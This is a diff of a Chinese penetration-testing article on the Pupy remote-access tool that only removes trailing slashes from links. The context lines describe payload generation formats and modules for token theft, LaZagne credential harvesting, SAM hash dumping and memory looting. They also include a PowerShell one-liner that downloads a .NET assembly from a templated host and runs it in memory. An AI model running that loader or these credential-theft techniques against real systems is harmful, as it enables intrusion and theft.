@@ -129,7 +129,7 @@ gen -f pyinst
 
 同`gen -f py`的区别：添加了一些头文件，便于使用pyinstaller将Python脚本转换成exe文件
 
-在之前的文章[《本地密码查看工具LaZagne中的自定义脚本开发》](https://3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7LaZagne%E4%B8%AD%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/)介绍过pyinstaller的用法
+在之前的文章[《本地密码查看工具LaZagne中的自定义脚本开发》](https://3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7LaZagne%E4%B8%AD%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91)介绍过pyinstaller的用法
 
 ### 4.py_oneliner
 
@@ -211,7 +211,7 @@ gen -f csharp
 
 上述命令对应的模板文件名称为pupyx86.dll
 
-C#文件的编译和使用方法可参考之前的文章[《通过.NET实现内存加载PE文件》](https://3gstudent.github.io/%E9%80%9A%E8%BF%87.NET%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDPE%E6%96%87%E4%BB%B6/)
+C#文件的编译和使用方法可参考之前的文章[《通过.NET实现内存加载PE文件》](https://3gstudent.github.io/%E9%80%9A%E8%BF%87.NET%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDPE%E6%96%87%E4%BB%B6)
 
 ### 9..NET
 
@@ -227,7 +227,7 @@ gen -f .NET
 
 需要安装mono开发环境，kali安装命令为`apt-get install mono-mcs`
 
-关于mono的使用可以参考之前的文章[《通过Mono(跨平台.NET运行环境)执行shellcode》](https://3gstudent.github.io/%E9%80%9A%E8%BF%87Mono(%E8%B7%A8%E5%B9%B3%E5%8F%B0.NET%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83)%E6%89%A7%E8%A1%8Cshellcode/)
+关于mono的使用可以参考之前的文章[《通过Mono(跨平台.NET运行环境)执行shellcode》](https://3gstudent.github.io/%E9%80%9A%E8%BF%87Mono(%E8%B7%A8%E5%B9%B3%E5%8F%B0.NET%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83)%E6%89%A7%E8%A1%8Cshellcode)
 
 这个命令是在`gen -f csharp`的基础上，添加了使用mono编译的功能
 
@@ -255,7 +255,7 @@ powershell从内存加载.NET程序集的实现代码如下：
 [Reflection.Assembly]::Load(""(new-object net.webclient).DownloadData(""'http://{link_ip}:{port}{landing_uri}')).GetTypes()[0].GetMethods("")[0].Invoke($null,@())"
 ```
 
-之前的文章[《从内存加载.NET程序集(Assembly.Load)的利用分析》](https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/)分析过从内存加载.NET程序集的方法
+之前的文章[《从内存加载.NET程序集(Assembly.Load)的利用分析》](https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90)分析过从内存加载.NET程序集的方法
 
 ### 补充：额外的参数
 
@@ -343,15 +343,15 @@ https://github.com/n1nj4sec/pupy/wiki/Get-Started#transport
 
 (1)列出/模拟进程token，模块：impersonate
 
-关于token的利用方法可以参考之前的文章[《渗透技巧——Token窃取与利用》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/)
+关于token的利用方法可以参考之前的文章[《渗透技巧——Token窃取与利用》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8)
 
 (2)获得当前权限，模块：getprivs
 
-关于权限的利用方法可以参考之前的文章[《渗透技巧——Windows九种权限的利用》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8/)
+关于权限的利用方法可以参考之前的文章[《渗透技巧——Windows九种权限的利用》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8)
 
 (3)获得当前进程的父进程，模块：getppid
 
-通过父进程进行权限切换可以参考之前的文章[《渗透技巧——从Admin权限切换到System权限》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/)
+通过父进程进行权限切换可以参考之前的文章[《渗透技巧——从Admin权限切换到System权限》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90)
 
 ### 3.凭据获取
 
@@ -359,11 +359,11 @@ https://github.com/n1nj4sec/pupy/wiki/Get-Started#transport
 
 源码地址：https://github.com/AlessandroZ/LaZagne/
 
-之前的文章[《本地密码查看工具LaZagne中的自定义脚本开发》](https://3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7LaZagne%E4%B8%AD%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/)曾介绍过LaZagne
+之前的文章[《本地密码查看工具LaZagne中的自定义脚本开发》](https://3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7LaZagne%E4%B8%AD%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91)曾介绍过LaZagne
 
 (2)从注册表导出本地用户hash，模块：creddump
 
-相关细节可以参考之前的文章[《渗透技巧——通过SAM数据库获得本地用户hash》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash/)
+相关细节可以参考之前的文章[《渗透技巧——通过SAM数据库获得本地用户hash》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash)
 
 (3)监控内存并查找明文凭据，模块：loot_memory
 
